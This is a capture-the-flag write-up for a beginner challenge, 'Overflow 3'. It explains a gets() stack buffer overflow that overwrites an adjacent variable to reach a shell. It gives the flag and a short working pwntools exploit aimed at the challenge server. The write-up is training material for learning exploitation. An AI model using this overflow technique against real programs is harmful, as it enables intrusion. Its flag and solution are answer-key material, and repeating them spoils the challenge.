# Overflow 3
We look at the c source file, and see there's a variable called vuln set to 0. It uses gets to read into a 16 byte buffer. Then, it compares the variable vuln to 0xd3adb33f, and pops a shell if they are equal. We can do a simple variable overwrite with the buffer overflow, overwriting the value of vuln on the stack. Vuln is at ebp-0xc, the buffer is at ebp-0x1c, so we send 16 bytes and then 0xd3adb33f.

#### Flag: CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}
```py
from pwn import *
NUM_TO_VAR = 0x10
padding = b'A'*NUM_TO_VAR
e = ELF("./overflow3")
p = e.process() if args.LOCAL else remote('cyberyoddha.baycyber.net', 10003)
p.sendline(padding + p32(0xd3adb33f))
p.interactive()
```
